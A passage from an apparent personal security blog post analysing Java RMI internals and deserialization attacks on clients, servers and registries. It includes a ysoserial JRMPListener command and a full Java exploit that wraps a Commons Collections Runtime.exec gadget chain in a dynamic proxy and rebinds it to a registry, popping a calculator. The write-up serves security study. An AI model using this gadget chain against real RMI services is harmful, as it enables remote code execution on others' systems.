<h4 id="From-Server-View"><a href="#From-Server-View" class="headerlink" title="From Server View"></a>From Server View</h4><p>As the last section, we make a breakpoint in <code>Transport#serviceCall</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725210630202.png" class title="image-20230725210630202">

<p>Same as before, we go into the <code>UnicastServerRef#dispatch</code></p>
<p>But this time, we will not call the <code>oldDispatch</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725210839708.png" class title="image-20230725210839708">

<p>And the method here is the <code>sayHello()</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725211038114.png" class title="image-20230725211038114">

<p>But next, we can see the <code>unmarshalValue</code> method here, which means there exists a deserialization vulnerability.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725211205647.png" class title="image-20230725211205647">

<p>And finally, server will make a reflection call and pack the response.</p>
<h3 id="DGC"><a href="#DGC" class="headerlink" title="DGC"></a>DGC</h3><p>DGC is an automatically created class to clean up memory.</p>
<p>As we metioned in 3.3.1, we also put a <code>DGCImpl_Stub</code> into the <code>objTable</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725212228180.png" class title="image-20230725212228180">

<p>Like Registry at client side, we will also create a <code>DGCImpl_Stub</code></p>
<p>However, there both exists Deserialization in <code>DGCImpl_Stub#dirty</code> and <code>DGCImpl_Skel#dispatch</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725213020333.png" class title="image-20230725213020333">

<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230725213044448.png" class title="image-20230725213044448">

<p>So it is also vulnerable.</p>
<h2 id="Attack-Method"><a href="#Attack-Method" class="headerlink" title="Attack Method"></a>Attack Method</h2><h3 id="Attack-Client"><a href="#Attack-Client" class="headerlink" title="Attack Client"></a>Attack Client</h3><h4 id="Registry-attack-Client"><a href="#Registry-attack-Client" class="headerlink" title="Registry attack Client"></a>Registry attack Client</h4><p>As we discussed before, if we call the <code>RegistryImpl_Stub#lookup</code>, it will deserialize the data from the registry.</p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230726145135207.png" class title="image-20230726145135207">

<p>Therefore, here is vulnerable and we can use <code>ysoserial</code> to generate the payload.</p>
<p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#39;open -a calculator&#39;</code></p>
<img src="/2023/07/25/Java-RMI/07/25/Java-RMI/image-20230726150157036.png" class title="image-20230726150157036">

<p>Besides, <code>RegistryImpl_Stub#bind</code>, <code>RegistryImpl_Stub#list</code> can also trigger this vulnerability.</p>
<h4 id="Server-attack-Client"><a href="#Server-attack-Client" class="headerlink" title="Server attack Client"></a>Server attack Client</h4><ol>
<li><p>When the server returns an object to the client, the client has to deserialize it . So if we returned a evil malicious object, the client will be attack.</p>
</li>
<li><p>Remote Class Loading</p>
<p>Server returns a non-existent class to Client, requiring Client to go to codebase address to remotely load malicious class triggers vulnerability.</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1091/">https://paper.seebug.org/1091/</a></p>
</li>
</ol>
<p>The conditions for such exploit are very harsh and the availability is not strong.</p>
<h3 id="Attack-Server"><a href="#Attack-Server" class="headerlink" title="Attack Server"></a>Attack Server</h3><ol>
<li><p>malicious parameter</p>
<p>A deserialization vulnerability can be triggered by a malicious Client passing in a malicious data stream when the invoked method on the Server side has parameters of a <strong>non-basic</strong> type.</p>
<p>If the server ask to receive a specific type, we can use <a target="_blank" rel="noopener" href="https://github.com/mogwailabs/rmi-deserialization/blob/master/BSides%20Exploiting%20RMI%20Services.pdf">some way</a> to bypass the limitation.</p>
</li>
<li><p>Remote Class Loading</p>
</li>
</ol>
<h3 id="Attack-Registry"><a href="#Attack-Registry" class="headerlink" title="Attack Registry"></a>Attack Registry</h3><p>If we are a malicious Server side that delivers a malicious object to the Registry side <strong>(Server and Registry are not on the same host)</strong>, a malicious call can be triggered on its deserialization.</p>
<p>But, the class we bind must extends <code>Remote</code> class.</p>
<p>So we can use <code>AnnotationInvocationHandler</code>  to create a dynamic proxy of Remote.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler.invoke()</span><br><span class="line">--&gt;TiedMapEntry.get()</span><br><span class="line">--&gt;LazyMap.get()</span><br><span class="line">--&gt;ConstantTransformer.transform()</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argc)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">1099</span>);</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> ChainedTransformer.getInstance(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                        ConstantTransformer.getInstance(</span><br><span class="line">                                Runtime.class</span><br><span class="line">                        ),</span><br><span class="line">                        InvokerTransformer.getInstance(</span><br><span class="line">                                <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;</span><br><span class="line">                        ),</span><br><span class="line">                        InvokerTransformer.getInstance(</span><br><span class="line">                                <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;</span><br><span class="line">                        ),</span><br><span class="line">                        InvokerTransformer.getInstance(</span><br><span class="line">                                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;</span><br><span class="line">                        ),</span><br><span class="line">                        ConstantTransformer.getInstance(<span class="number">123</span>)</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="type">Map</span> <span class="variable">expMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;(), transformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">tmpMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;(), <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(tmpMap, <span class="string">&quot;exp&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        hashMap.put(map, <span class="number">1</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> TiedMapEntry.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(map, expMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">C</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> C.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, hashMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Remote</span> <span class="variable">evil</span> <span class="operator">=</span> (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Remote.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        registry.rebind(<span class="string">&quot;evil&quot;</span>, evil);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://su18.org/post/rmi-attack/">https://su18.org/post/rmi-attack/</a></p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/19/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9801-RMI%E5%9F%BA%E7%A1%80/">https://drun1baby.top/2022/07/19/Java反序列化之RMI专题01-RMI基础/</a></p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/07/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BRMI%E4%B8%93%E9%A2%9802-RMI%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F/">https://drun1baby.top/2022/07/23/Java反序列化之RMI专题02-RMI的几种攻击方式/</a></p>
<p><a target="_blank" rel="noopener" href="https://p4d0rn.gitbook.io/java/prerequisites/rmi">https://p4d0rn.gitbook.io/java/prerequisites/rmi</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-RMI"><span class="toc-number">1.</span> <span class="toc-text">Java-RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Procedure"><span class="toc-number">1.2.</span> <span class="toc-text">Procedure</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Code-Analysing"><span class="toc-number">1.3.</span> <span class="toc-text">Code Analysing</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DEMO"><span class="toc-number">1.3.1.</span> <span class="toc-text">DEMO</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Server"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">Server</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Client"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">Client</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Create-a-RemoteObj"><span class="toc-number">1.3.2.</span> <span class="toc-text">Create a RemoteObj</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Register-the-RemoteObj"><span class="toc-number">1.3.3.</span> <span class="toc-text">Register the RemoteObj</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Create-a-Registry"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">Create a Registry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bind"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">bind</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Visit-Registry-to-fetch-the-RemoteObj"><span class="toc-number">1.3.4.</span> <span class="toc-text">Visit Registry to fetch the RemoteObj</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#From-Client-View"><span class="toc-number">1.3.4.1.</span> <span class="toc-text">From Client View</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#From-Registry-View"><span class="toc-number">1.3.4.2.</span> <span class="toc-text">From Registry View</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Call-Remote-Method"><span class="toc-number">1.3.5.</span> <span class="toc-text">Call Remote Method</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#From-Client-View-1"><span class="toc-number">1.3.5.1.</span> <span class="toc-text">From Client View</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#From-Server-View"><span class="toc-number">1.3.5.2.</span> <span class="toc-text">From Server View</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DGC"><span class="toc-number">1.3.6.</span> <span class="toc-text">DGC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Attack-Method"><span class="toc-number">1.4.</span> <span class="toc-text">Attack Method</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Client"><span class="toc-number">1.4.1.</span> <span class="toc-text">Attack Client</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Registry-attack-Client"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">Registry attack Client</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Server-attack-Client"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">Server attack Client</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Server"><span class="toc-number">1.4.2.</span> <span class="toc-text">Attack Server</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Registry"><span class="toc-number">1.4.3.</span> <span class="toc-text">Attack Registry</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.5.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/07/25/Java-RMI/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/07/25/Java-RMI/&text=Java RMI"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/07/25/Java-RMI/&title=Java RMI"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/07/25/Java-RMI/&is_video=false&description=Java RMI"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Java RMI&body=Check out this article: http://example.com/2023/07/25/Java-RMI/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/07/25/Java-RMI/&title=Java RMI"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/07/25/Java-RMI/&title=Java RMI"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/07/25/Java-RMI/&title=Java RMI"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/07/25/Java-RMI/&title=Java RMI"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/07/25/Java-RMI/&name=Java RMI&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/07/25/Java-RMI/&t=Java RMI"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    P3ngu1nW
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
